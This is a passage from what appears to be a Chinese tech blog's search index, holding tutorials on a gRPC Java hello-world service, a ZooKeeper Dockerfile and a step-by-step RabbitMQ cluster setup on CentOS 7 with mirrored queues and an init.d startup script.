完整的写法，同时指定Message、Service代码生成的目录位置为src/main/javaprotobuf { protoc { artifact = "com.google.protobuf:protoc:3.7.1" } plugins { grpc { artifact = \'io.grpc:protoc-gen-grpc-java:1.21.0\' } } generateProtoTasks { all()*.plugins { grpc { outputSubDir = \'java\' } } } generatedFilesBaseDir = \'src\'} RPC 服务提供者的实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566package com.grpc.demo.provider.service;import com.grpc.demo.generate.GreeterGrpc;import com.grpc.demo.generate.HelloReply;import com.grpc.demo.generate.HelloRequest;import io.grpc.Server;import io.grpc.ServerBuilder;import io.grpc.stub.StreamObserver;import java.io.IOException;import java.util.logging.Logger;public class HelloWorldProvider { private Server server; private static final Logger logger = Logger.getLogger(HelloWorldProvider.class.getName()); private void start() throws IOException { int port = 50051; server = ServerBuilder.forPort(port) .addService(new GreeterImpl()) .build() .start(); logger.info("==&gt; Server started, listening on " + port); Runtime.getRuntime().addShutdownHook(new Thread() { @Override public void run() { System.err.println("*** shutting down gRPC server since JVM is shutting down"); HelloWorldProvider.this.stop(); System.err.println("*** server shut down"); } }); } private void stop() { if (server != null) { server.shutdown(); } } /** * Await termination on the main thread since the grpc library uses daemon threads. */ private void blockUntilShutdown() throws InterruptedException { if (server != null) { server.awaitTermination(); } } public static void main(String[] args) throws IOException, InterruptedException { final HelloWorldProvider server = new HelloWorldProvider(); server.start(); server.blockUntilShutdown(); } static class GreeterImpl extends GreeterGrpc.GreeterImplBase { @Override public void sayHello(HelloRequest req, StreamObserver&lt;HelloReply&gt; responseObserver) { HelloReply reply = HelloReply.newBuilder().setMessage("Hello " + req.getName()).build(); responseObserver.onNext(reply); responseObserver.onCompleted(); } }} RPC 服务消费者的实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.grpc.demo.consumer.service;import com.grpc.demo.generate.GreeterGrpc;import com.grpc.demo.generate.HelloReply;import com.grpc.demo.generate.HelloRequest;import io.grpc.ManagedChannel;import io.grpc.ManagedChannelBuilder;import io.grpc.StatusRuntimeException;import java.util.concurrent.TimeUnit;import java.util.logging.Level;import java.util.logging.Logger;public class HelloWorldConsumer { private final ManagedChannel channel; private final GreeterGrpc.GreeterBlockingStub blockingStub; private static final Logger logger = Logger.getLogger(HelloWorldConsumer.class.getName()); public HelloWorldConsumer(String host, int port) { this(ManagedChannelBuilder.forAddress(host, port) .usePlaintext() .build()); } HelloWorldConsumer(ManagedChannel channel) { this.channel = channel; blockingStub = GreeterGrpc.newBlockingStub(channel); } public void shutdown() throws InterruptedException { channel.shutdown().awaitTermination(5, TimeUnit.SECONDS); } public void greet(String name) { logger.info("==&gt; Will try to greet " + name + " ..."); HelloRequest request = HelloRequest.newBuilder().setName(name).build(); HelloReply response; try { response = blockingStub.sayHello(request); } catch (StatusRuntimeException e) { logger.log(Level.WARNING, "RPC failed: {0}", e.getStatus()); return; } logger.info("==&gt; Greeting: " + response.getMessage()); } public static void main(String[] args) throws Exception { HelloWorldConsumer client = new HelloWorldConsumer("localhost", 50051); try { String user = "World"; client.greet(user); } finally { client.shutdown(); } }} 先后启动 Provider、Consumer 应用，最终输出的日志信息如下图所示 Provider 应用的日志信息： Consumer 应用的日志信息： var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"编写 DockerFile 构建 ZooKeeper 镜像",url:"/posts/b683a4df.html",text:'下载软件压缩包12├── jdk-8u201-linux-x64.tar.gz└── apache-zookeeper-3.5.5.tar.gz 编写 DockerFile 文件123456789101112131415161718192021222324252627282930FROM centosMAINTAINER peter&lt;peter@gmail.com&gt;ADD jdk-8u201-linux-x64.tar.gz /usr/localADD apache-zookeeper-3.5.5.tar.gz /usr/localRUN yum -y updateRUN yum -y install vim net-tools telnet tree git wget curlENV work_path /usr/localWORKDIR $work_path# JDKENV JAVA_HOME /usr/local/jdk1.8.0_201ENV JRE_HOME /usr/local/jdk1.8.0_201/jreENV CLASSPATH .:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib# ZooKeeperENV ZOOKEEPER_HOME /usr/local/apache-zookeeper-3.5.5# PATHENV PATH $PATH:$JAVA_HOME/bin:$JRE_HOME/bin:$ZOOKEEPER_HOME/binRUN cp $ZOOKEEPER_HOME/conf/zoo_sample.cfg $ZOOKEEPER_HOME/conf/zoo.cfgEXPOSE 2181CMD $ZOOKEEPER_HOME/bin/zkServer.sh start-foreground 构建 ZooKeeper 镜像，创建并启动容器12345# 构建镜像# docker build -f docker-file -t zookeeper:3.5.5 .# 创建并启动容器# docker run -d --name zookeeper -p 2181:2181 zookeeper:3.5.5 测试客户端连接 ZooKeeper 服务器123456789101112131415161718192021222324252627282930313233# 连接ZooKeeper容器# docker exec -it zookeeper /bin/bash# 进入ZooKeeper的bin目录# cd apache-zookeeper-3.5.5/bin# 客户端连接ZooKeeper服务器端$ ./zkCli.sh -server 127.0.0.1:2181# 创建节点[zk: 127.0.0.1:2181(CONNECTED) 1] create -e /test-node 123456# 列出所有根节点[zk: 127.0.0.1:2181(CONNECTED) 2] ls /[test-node, zookeeper]# 获取指定节点的值[zk: 127.0.0.1:2181(CONNECTED) 3] get /test-node123456cZxid = 0x4ctime = Fri Feb 22 02:27:43 UTC 2019mZxid = 0x4mtime = Fri Feb 22 02:27:43 UTC 2019pZxid = 0x4cversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x1000a766c5e0001dataLength = 6numChildren = 0# 断开客户端连接[zk: 127.0.0.1:2181(CONNECTED) 4] quit var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Centos7 搭建 RabbitMQ 集群（超详细）",url:"/posts/486aeff3.html",text:'前言集群模式RabbitMQ 是用 Erang 开发的，集群模式分为两种普通模式 和镜像模式，可以说镜像模式是普通模式的升级版，其中 RabbitMQ 默认使用的是 普通模式。 普通模式：以两个节点（rabbit01、rabbit02）为例来进行说明，rabbit01 和 rabbit02 两个节点仅有相同的元数据，即队列的结构，但消息实体只存在于其中一个节点 rabbit01（或者 rabbit02）中。当消息进入 rabbit01 节点的 Queue 后，consumer 从 rabbit02 节点消费时，RabbitMQ 会临时在 rabbit01、rabbit02 间进行消息传输，把 A 中的消息实体取出并经过 B 发送给 consumer。所以 consumer 应尽量连接每一个节点，从中取消息。即对于同一个逻辑队列，要在多个节点建立物理 Queue。否则无论 consumer 连 rabbit01 或 rabbit02，出口总在 rabbit01，会产生瓶颈。当 rabbit01 节点故障后，rabbit02 节点无法取到 rabbit01 节点中还未消费的消息实体。如果做了消息持久化，那么得等 rabbit01 节点恢复，然后才可被消费；如果没有持久化的话，就会产生消息丢失的现象。 镜像模式：在普通模式的基础上，把需要的队列做成镜像队列，存在于多个节点，消息实体会主动在镜像节点间同步，而不是在客户端取数据时临时拉取，也就是说多少节点消息就会备份多少份。该模式带来的副作用也很明显，除了降低系统性能外，如果镜像队列数量过多，加之大量的消息进入，集群内部的网络带宽将会被这种同步通讯大大消耗掉，所以在对业务可靠性要求较高的场合中适用。由于镜像队列之间消息自动同步，且内部有选举 Master 机制，即使 Master 节点宕机也不会影响整个集群的使用，达到去中心化的目的，从而有效的防止消息丢失及服务不可用等问题 集群节点的区别RabbitMQ 的集群节点分为磁盘节点、内存节点。RabbitMQ 支持消息的持久化，也就是数据写在磁盘上。在 RabbitMQ 集群中，必须至少有一个磁盘节点，否则队列元数据无法写入到集群中。当磁盘节点宕掉时，集群将无法写入新的队列元数据信息。如果 RabbitMQ 集群全部宕机，必须先启动磁盘节点，然后再启动内存节点。最合适的方案就是既有磁盘节点，又有内存节点，推荐 1 个 磁盘节点 + 2 个内存节点的集群搭建方式。 准备工作集群规划 名称 IP 端口 用途 RabbitMQ 节点名称 节点一 192.168.1.109 15672 磁盘节点 rabbit@rabbitmq1 节点二 192.168.1.201 15672 内存节点 rabbit@rabbitmq2 节点三 192.168.1.200 15672 内存节点 rabbit@rabbitmq3 注意，在生产环境搭建 RabbitMQ 集群时，所有集群节点要求都可以连接上互联网，另外 RabbitMQ 集群节点建议都在同一网段里，如果是跨广域网（外网），效果会变差。 系统初始化 更改系统的最大打开文件描述符数 创建用户和用户组12345# 创建rabbitmq用户组# groupadd rabbitmq# 创建rabbitmq用户（不允许远程登录）# useradd -g rabbitmq rabbitmq -s /bin/false RabbitMQ 集群安装Erlang 安装在每个集群节点上分别编译安装 Erlang，这里使用的版本是 23.2，其他版本的 Erlang 可以从 Erlang 官网 下载 1234567891011121314151617181920212223242526272829303132# 安装依赖# yum install -y make autoconf gcc gcc-c++ glibc-devel kernel-devel m4 ncurses-devel openssl-devel unixODBC unixODBC-devel libtool libtool-ltdl-devel unzip# 创建安装目录# mkdir -p /usr/local/erlang-23.2# 下载# wget https://erlang.org/download/otp_src_23.2.tar.gz# 解压# tar -xvf otp_src_23.2.tar.gz# 进入解压目录# cd otp_src_23.2# 配置# ./otp_build autoconf# ./configure --prefix=/usr/local/erlang-23.2 --without-javac# 编译安装# make &amp;&amp; make install# 创建软链接# ln -sf /usr/local/erlang-23.2/bin/erl /usr/bin/erl# 配置环境变量# vim /etc/profileexport ERLANG_HOME=/usr/local/erlang-23.2export PATH=$PATH:$ERLANG_HOME/bin# 使环境变量生效# source /etc/profile RabbitMQ 安装在每个集群节点上分别使用二进制包的方式安装 RabbitMQ，使用的版本是 3.8.6，其他版本的 RabbitMQ 可以从 RabbitMQ Github 下载 123456789101112131415# 安装依赖# yum install -y xmlto python-simplejson# 下载# wget https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.6/rabbitmq-server-generic-unix-3.8.6.tar.xz# 解压# xz -d rabbitmq-server-generic-unix-3.8.6.tar.xz# tar -xvf rabbitmq-server-generic-unix-3.8.6.tar# 拷贝安装文件# cp -r rabbitmq_server-3.8.6 /usr/local/rabbitmq# 文件授权# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq RabbitMQ 配置在每个集群节点上分别配置 RabbitMQ，包括创建默认的日志目录与数据目录、启用 Web 控制台管理插件 123456789101112131415161718192021# 创建默认的日志目录与数据目录# mkdir -p /usr/local/rabbitmq/var/log/rabbitmq# mkdir -p /usr/local/rabbitmq/var/lib/rabbitmq/mnesia# 创建默认的配置文件# touch /usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config# echo "[]." &gt; /usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config# 创建默认的环境变量文件# touch /usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf# echo "CONF_ENV_FILE=/usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf" &gt;&gt; /usr/local/rabbitmq/sbin/rabbitmq-defaults# 启用Web控制台管理插件# cd /usr/local/rabbitmq/sbin# ./rabbitmq-plugins enable rabbitmq_management# 查看所有插件的安装信息# ./rabbitmq-plugins list# 文件授权# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq 在每个集群节点上分别配置 RabbitMQ，包括创建虚拟主机、超级管理员用户、设置角色权限。由于出于系统安全考虑，RabbitMQ 默认限制了 guest 用户只能通过 localhost 登录使用，因此需要手动创建管理员帐号，并更改 guest 用户默认的密码 1234567891011121314151617181920212223242526# 进入安装目录# cd /usr/local/rabbitmq/sbin# 前台启动RabbitMQ服务（默认会打印出日志文件和配置文件的路径）# ./rabbitmq-server# 或者后台启动RabbitMQ服务# ./rabbitmq-server -detached# 创建虚拟主机（相当于MySQL的数据库概念）# ./rabbitmqctl add_vhost /# 更改guest用户默认的密码# ./rabbitmqctl change_password guest yourPassword# 创建超级管理员用户# ./rabbitmqctl add_user admin yourPassword# 赋予administrator角色给超级管理员用户# ./rabbitmqctl set_user_tags admin administrator# 赋予超级管理员用户权限# ./rabbitmqctl set_permissions -p / admin \'.*\' \'.*\' \'.*\'# 彻底关闭后台启动的RabbitMQ服务# ./rabbitmqctl stop RabbitMQ 普通集群搭建添加节点主机名在每个集群节点上分别编辑 /etc/hosts 配置文件，指定各个节点的主机名 1234# vim /etc/hosts192.168.1.109 rabbitmq1192.168.1.201 rabbitmq2192.168.1.200 rabbitmq3 配置节点的名称RabbitMQ 节点由节点名称（RABBITMQ_NODENAME）标识，节点名称由两部分组成，前缀（默认是 rabbit）和主机名，例如：rabbit@rabbit1 是一个包含前缀 rabbit 和主机名 rabbit1 的节点名称。可以在同一台主机上运行多个 RabbitMQ 节点，但集群中每个节点必须有一个唯一的 RABBITMQ_NODENAME。若在同一台主机上运行多个节点（开发和 QA 环境中通常是这种情况），每个节点还必须使用不同的前缀，例如：rabbit1@hostname1 和 rabbit2@hostname2。在集群中，节点使用节点名称标识和联系彼此，这意味着必须解析每个节点名的主机名部分。当节点启动时，它会检查是否已为其分配了节点名，这是通过配置文件 rabbitmq-env.conf 里的 RABBITMQ_NODENAME 环境变量指定，如果环境变量没有配置，则节点将解析其主机名并在其前面添加 rabbit 来计算其节点名。 在每个集群节点上分别配置节点名称，只需将下面 rabbit@xxx 中的 xxx 替换为该节点的主机名即可，例如节点一的节点名称为： rabbit@rabbitmq1 12# 配置节点名称# echo "NODENAME=rabbit@xxx" &gt;&gt; /usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf 拷贝 Erlang CookieRabbitMQ 的集群是依附于 Erlang 的集群来工作的，所以必须先构建起 Erlang 的集群。Erlang 的集群中各节点是经由过程一个 cookie 来实现的，当使用解压缩的方式来安装 RabbitMQ 时，那么这个 cookie 存放在 ${home}/.erlang.cookie 中，文件是 400 的权限。必须保证集群各节点的 cookie 一致，不然节点之间就无法通信。 123# 拷贝节点一的Cookie到其他节点# scp /root/.erlang.cookie root@rabbitmq2:/root/# scp /root/.erlang.cookie root@rabbitmq3:/root/ 构建集群节点在每个集群节点上分别启动 RabbitMQ 的服务，这里默认使用的用户为 root。当使用解压缩的方式来安装 RabbitMQ 时，cookie 是存放在 ${home}/.erlang.cookie，因此这里必须注意各个节点的 RabbitMQ 是使用哪个用户启动，否则后续很可能由于各节点的 .erlang.cookie 不一致而导致节点无法加入集群。 12345# 进入安装目录# cd /usr/local/rabbitmq/sbin# 后台启动RabbitMQ服务# ./rabbitmq-server -detached 在节点二执行以下操作，将节点二（rabbit@rabbitmq2）加入到 RabbitMQ 集群 1234567891011# 进入节点二的安装目录# cd /usr/local/rabbitmq/sbin# 停止节点二的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq2 stop_app# 将节点二加入到集群中，"--ram" 表示节点二为内存节点# ./rabbitmqctl -n rabbit@rabbitmq2 join_cluster rabbit@rabbitmq1 --ram# 启动节点二的RabbitMQ服务# ./rabbitmqctl -n rabbit@rabbitmq2 start_app 在节点三执行以下操作，将节点三（rabbit@rabbitmq3）加入到 RabbitMQ 集群 1234567891011# 进入节点三的安装目录# cd /usr/local/rabbitmq/sbin# 停止节点三的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq3 stop_app# 将节点三加入到集群中，"--ram" 表示节点三为内存节点# ./rabbitmqctl -n rabbit@rabbitmq3 join_cluster rabbit@rabbitmq1 --ram# 启动节点三的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq3 start_app 在任意节点上查看集群的状态 12345# 进入安装目录# cd /usr/local/rabbitmq/sbin# 查看集群状态# ./rabbitmqctl cluster_status 搭建集群时，停止 RabbitMQ 服务必须使用 stop_app 命令，而不是 stop 命令，否则无法将节点加入到集群中 默认情况下，RabbitMQ 启动后是磁盘节点，在上面的 join_cluster 命令下，rabbitmq2 和 rabbitmq3 是内存节点，rabbitmq1 是磁盘节点 若要使 rabbitmq2 和 rabbitmq3 都成为磁盘节点，去掉 --ram 参数即可，或者使用 --disc 参数替代 如果想要更改节点类型，可以使用命令 rabbitmqctl change_cluster_node_type disc(ram)，前提是必须停掉 RabbitMQ 服务 测试集群节点若集群节点构建成功，通过浏览器访问任意节点的 Web 控制台，例如 http://192.168.1.109:15672，会看到如下的内容。最后可以在节点一创建队列 test，如果在节点二、节点三的 Web 控制台，也可以看到对应的 test 队列，则说明各集群节点的元数据（队列的结构）同步正常。至此，RabbitMQ 的普通集群搭建完成。 RabbitMQ 镜像集群搭建上面已经完成 RabbitMQ 普通集群的搭建，但并不能保证队列的高可用性，尽管交换机、队列、绑定这些可以复制到集群里的任何一个节点，但是队列内容（消息）不会复制。虽然普通集群解决可以一项目组的节点压力，但队列节点（磁盘节点）宕机会直接导致其他节点的队列（内存节点）无法使用，只能等待队列节点（磁盘节点）重启，所以要想在队列节点（磁盘节点）宕机或故障也能正常应用，就要复制队列内容（消息）到集群里的每个节点，因此必须要创建镜像队列。镜像队列是基于普通的集群模式的，然后再添加一些策略，所以还是得先配置普通集群，然后才能设置镜像队列。设置镜像队列可以在 RabbitMQ 的 Web 控制台进行，也可以通过命令，这里介绍是其中的 Web 控制台设置方式。 创建策略在节点一的 Web 控制台上创建策略： 点击 Admin 菜单 –&gt; 右侧的 Policies 选项 按照图中的内容根据自己的需求填写 Name：策略名称 Pattern：匹配的规则，^a 表示匹配 a 开头的队列，如果是匹配所有的队列，那就是 ^. Definition：使用 ha-mode 模式中的 all，也就是同步所有匹配的队列 点击左侧最下边的 Add/update a policy 按钮新增策略 此时分别登录节点二、节点三的 Web 控制台，同样可以看到刚添加的这个策略 创建队列在节点一的 Web 控制台上创建队列： 点击 Queues 菜单 输入 Name 和 Arguments` 参数的值，别的参数默认即可 Name：队列名称Durability：队列是否持久化Node：消息队列的节点Auto delete：是否自动删除Arguments：使用的策略类型 点击左侧下边的 Add a new queue 按钮新增队列，将鼠标指向 +2 可以显示出另外两台节点 创建消息 点击 ab 队列按钮，拖动滚动条 填写相关内容 2-Persistent：表示持久化Headers：随便填写即可Properties：点击问号，选择一个消息 ID 号Payload：消息内容 点击 Publish message 按钮新增消息，可发现 ab 队列的 Ready 和 Total 中多了一条消息记录 验证高可用性 将节点一的 RabbitMQ 服务关闭，再通过节点一和节点二，查看消息记录是否还存在，结果可以看到在其他节点的消息记录是存在的 再将节点二的 RabbitMQ 服务关闭，通过节点三查看消息记录是否还存在，结果可以看到 ab 队列和消息记录还是存在的，只是变成了只有一个节点 将节点一和节点二的 RabbitMQ 服务重启，从中可以看到 ab 队列后面 +2 变成了红色，鼠标指上去显示镜像无法同步 采取的解决办法是选择在节点二上执行同步命令 12345# 进入节点一的安装目录# cd /usr/local/rabbitmq/sbin# 同步特定的队列# ./rabbitmqctl sync_queue ab 同步完成后，+2 标识又变成了蓝色，这样就测试了 RabbitMQ 集群的高可用性，说明镜像集群配置成功。 FAQ.erlang.cookie 解惑.erlang.cookie 是 Erlang 实现分布式集群的必要文件，Erlang 分布式集群要求每个节点上都要有相同的 .erlang.cookie 文件，同时保证文件的权限是 400。在搭建 RabbitMQ 集群的时候往往会因为 .erlang.cookie 而报各种错误，官方在介绍集群的文档中提到过 .erlang.cookie 一般会存在这两个路径：第一个是 ${home}/.erlang.cookie，第二个就是 /var/lib/rabbitmq/.erlang.cookie，具体说明如下： 如果 RPM 等安装包方式进行安装的，那么这个文件会在 /var/lib/rabbitmq 目录下，完整路径为 /var/lib/rabbitmq/.erlang.cookie 如果使用解压缩方式安装部署 RabbitMQ，那么这个文件会在 ${home} 目录下，也就是用户的 Home 目录下，完整路径为 ${home}/.erlang.cookie 通过 RabbitMQ 的启动日志，可以查看其 Home 目录是哪里，就可以知道 .erlang.cookie 存放在哪里，以及 mnesia 数据库信息存在哪里 12345678# RPM包安装方式node : rabbit@he10home dir : /var/lib/rabbitmqconfig file(s) : /etc/rabbitmq/rabbitmq.config (not found)cookie hash : qhOGp9TtH4Rn+BekiYXxIg==log : /var/log/rabbitmq/rabbit@he07.logsasl log : /var/log/rabbitmq/rabbit@he07-sasl.logdatabase dir : /var/lib/rabbitmq/mnesia/rabbit@he07 12345678# 解压缩安装方式（这里使用Root用户启动）node : rabbit@he10home dir : /rootconfig file(s) : /usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config (not found)cookie hash : 063Gh+RyPjHRzyuSPf9wWA==log : /usr/local/rabbitmq/var/log/rabbitmq/rabbit@he10.logsasl log : /usr/local/rabbitmq/var/log/rabbitmq/rabbit@he10-sasl.logdatabase dir : /usr/local/rabbitmq/var/lib/rabbitmq/mnesia/rabbit@he10 重新将节点加入集群这里假设由于各种原因（例如断电重启、节点宕机重启），节点二无法成功加入到集群，那么可以执行以下操作来解决。特别注意，以下操作会删除节点二的元数据（虚拟机、用户、角色、权限、已持久化的消息等），因此当节点二成功加入集群后，必须重新配置节点二的虚拟机、用户、角色、权限等，否则 RabbitMQ 客户端将无法连接节点二。 首先在节点一里，将节点二移出集群 12345# 进入节点一的安装目录# cd /usr/local/rabbitmq/sbin# 将节点二移出集群# ./rabbitmqctl -n rabbit@rabbitmq1 forget_cluster_node rabbit@rabbitmq2 然后重置节点二的元数据、集群配置等信息，其中会删除虚拟机、用户、角色、权限、已持久化的消息等元数据 1234567891011121314151617# 进入节点二的安装目录# cd /usr/local/rabbitmq/sbin# 后台启动节点二的RabbitMQ服务# ./rabbitmq-server -detached# 停止节点二的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq2 stop_app# 重置节点二的元数据、集群配置等信息# ./rabbitmqctl -n rabbit@rabbitmq2 reset# 重新将节点二加入到集群# ./rabbitmqctl -n rabbit@rabbitmq2 join_cluster rabbit@rabbitmq1 --ram# 启动节点二的RabbitMQ服务# ./rabbitmqctl -n rabbit@rabbitmq2 start_app 如果节点二仍然无法加入集群，可以直接删除节点二的所有数据库文件，然后重启节点二的 RabbitMQ 服务，最后重新将节点二加入到集群 1234567891011121314151617181920212223# 进入节点二的安装目录# cd /usr/local/rabbitmq/sbin# 彻底关闭节点二的RabbitMQ服务# ./rabbitmqctl -n rabbit@rabbitmq2 stop# 删除节点二的数据文件# rm -rf /usr/local/rabbitmq/var/lib/rabbitmq/mnesia/*# 后台启动节点二的RabbitMQ服务# ./rabbitmq-server -detached# 停止节点二的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq2 stop_app# 重置节点二的元数据、集群配置等信息# ./rabbitmqctl -n rabbit@rabbitmq2 reset# 重新将节点二加入到集群# ./rabbitmqctl -n rabbit@rabbitmq2 join_cluster rabbit@rabbitmq1 --ram# 启动节点二的RabbitMQ服务# ./rabbitmqctl -n rabbit@rabbitmq2 start_app 强制重置节点，force_reset 命令和 reset 的区别是无条件重置节点，不管当前管理数据库状态以及集群的配置，如果数据库或者集群配置发生错误才使用这个最后的手段 1# ./rabbitmqctl force_reset RabbitMQ 更改默认端口RabbitMQ 默认占用 4369、5672、15672、25672 默认端口号，更改默认端口的方法如下： 更改 15672 端口，配置文件路径：/usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config 12345678910111213[ {rabbitmq_management, [ {listener, [ {port, 15672}, {ip, "0.0.0.0"}, {ssl, false} ] } ] }]. 更改 5672、25672 端口，配置文件路径：/usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf 12NODE_PORT=5673DIST_PORT=25673 更改 4369 端口，配置文件路径：/etc/profile，单机可以多个 RabbitMQ 节点共用同一个 ERL_EPMD_PORT 端口 1export ERL_EPMD_PORT=4363 RabbitMQ 集群开机自启动 - 方案一将集群各节点的 RabbitMQ 服务托管给 Systemd 管理，这里以节点一为例子，若其他节点的端口号不相同，默认情况下只需更改服务自启动脚本中对应的端口号即可，该脚本支持单机搭建 RabbitMQ 集群。 1234567891011121314151617# 创建服务自启动脚本# touch /etc/init.d/rabbitmq-cluster-15672# 更改服务自启动脚本，写入后面给出的脚本内容# vim /etc/init.d/rabbitmq-cluster-15672# 服务自启动脚本授权# chmod u+x /etc/init.d/rabbitmq-cluster-15672# 开机自启动# chkconfig rabbitmq-cluster-15672 on# 查看开机自启动列表# chkconfig --list# 关闭开机自启动# chkconfig rabbitmq-cluster-15672 off RabbitMQ 集群各节点的服务管理 1234567891011# 关闭服务# systemctl stop rabbitmq-cluster-15672# 启动服务# systemctl start rabbitmq-cluster-15672# 查看服务状态# systemctl status rabbitmq-cluster-15672# 重启服务# systemctl restart rabbitmq-cluster-15672 ★展开服务自启动脚本的完整内容★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184#!/bin/sh## rabbitmq-cluster-15672 RabbitMQ broker## chkconfig: - 80 05# description: Enable AMQP service provided by RabbitMQ#### BEGIN INIT INFO# Provides: rabbitmq-cluster-15672# Required-Start: $remote_fs $network# Required-Stop: $remote_fs $network# Description: RabbitMQ broker# Short-Description: Enable AMQP service provided by RabbitMQ broker### END INIT INFO# Source function library.. /etc/init.d/functionsexport HOME=/home/rabbitmqPATH=/sbin:/usr/sbin:/bin:/usr/binUSER=rabbitmqNAME=rabbitmq-serverMQ_HOME=/usr/local/rabbitmqDAEMON=${MQ_HOME}/sbin/${NAME}CONTROL=${MQ_HOME}/sbin/rabbitmqctlROTATE_SUFFIX=DESC=rabbitmq-cluster-15672MAX_OPEN_FILES=1048576ulimit -n $MAX_OPEN_FILESSTART_PROG="daemon"PID_FILE=/var/run/rabbitmq/pid-15672LOCK_FILE=/var/lock/subsys/$NAME-15672INIT_LOG_DIR=${MQ_HOME}/var/log/rabbitmqtest -x $DAEMON || exit 0test -x $CONTROL || exit 0RETVAL=0set -e[ -f /etc/default/${NAME} ] &amp;&amp; . /etc/default/${NAME}ensure_pid_dir () { PID_DIR=`dirname ${PID_FILE}` if [ ! -d ${PID_DIR} ] ; then mkdir -p ${PID_DIR} chown -R ${USER}:${USER} ${PID_DIR} chmod 755 ${PID_DIR} fi}remove_pid () { rm -f ${PID_FILE} rmdir `dirname ${PID_FILE}` || :}start_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then echo RabbitMQ is currently running else RETVAL=0 ensure_pid_dir set +e RABBITMQ_PID_FILE=$PID_FILE $START_PROG $DAEMON \\ &gt; "${INIT_LOG_DIR}/startup_log" \\ 2&gt; "${INIT_LOG_DIR}/startup_err" \\ 0&lt;&amp;- &amp; $CONTROL wait $PID_FILE &gt;/dev/null 2&gt;&amp;1 RETVAL=$? set -e case "$RETVAL" in 0) echo SUCCESS if [ -n "$LOCK_FILE" ] ; then touch $LOCK_FILE fi ;; *) remove_pid echo FAILED - check ${INIT_LOG_DIR}/startup_\\{log, _err\\} RETVAL=1 ;; esac fi}stop_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then set +e $CONTROL stop ${PID_FILE} &gt; ${INIT_LOG_DIR}/shutdown_log 2&gt; ${INIT_LOG_DIR}/shutdown_err RETVAL=$? set -e if [ $RETVAL = 0 ] ; then remove_pid if [ -n "$LOCK_FILE" ] ; then rm -f $LOCK_FILE fi else echo FAILED - check ${INIT_LOG_DIR}/shutdown_log, _err fi else echo RabbitMQ is not running RETVAL=0 fi}status_rabbitmq() { set +e if [ "$1" != "quiet" ] ; then $CONTROL status 2&gt;&amp;1 else $CONTROL status &gt; /dev/null 2&gt;&amp;1 fi if [ $? != 0 ] ; then RETVAL=3 fi set -e}rotate_logs_rabbitmq() { set +e $CONTROL rotate_logs ${ROTATE_SUFFIX} if [ $? != 0 ] ; then RETVAL=1 fi set -e}restart_running_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then restart_rabbitmq else echo RabbitMQ is not runnning RETVAL=0 fi}restart_rabbitmq() { stop_rabbitmq start_rabbitmq}case "$1" in start) echo -n "Starting $DESC: " start_rabbitmq echo "$NAME." ;; stop) echo -n "Stopping $DESC: " stop_rabbitmq echo "$NAME." ;; status) status_rabbitmq ;; rotate-logs) echo -n "Rotating log files for $DESC: " rotate_logs_rabbitmq ;; force-reload|reload|restart) echo -n "Restarting $DESC: " restart_rabbitmq echo "$NAME." ;; try-restart) echo -n "Restarting $DESC: " restart_running_rabbitmq echo "$NAME." ;; *) echo "Usage: $0 {start|stop|status|rotate-logs|restart|condrestart|try-restart|reload|force-reload}" &gt;&amp;2 RETVAL=1 ;;esacexit $RETVAL RabbitMQ 集群开机自启动-方案二严格来说 RabbitMQ 并不适用使用 Supervior 来管理服务，因为当手动 Kill 掉 RabbitMQ 的进程时，Supervior 无法正常重启 RabbitMQ 的进程，具体原因可以看这里，但若只是简单实现 RabbitMQ 开机自启动，Supervior 无疑是可以胜任的。 使用 Supervior 托管管理 RabbitMQ 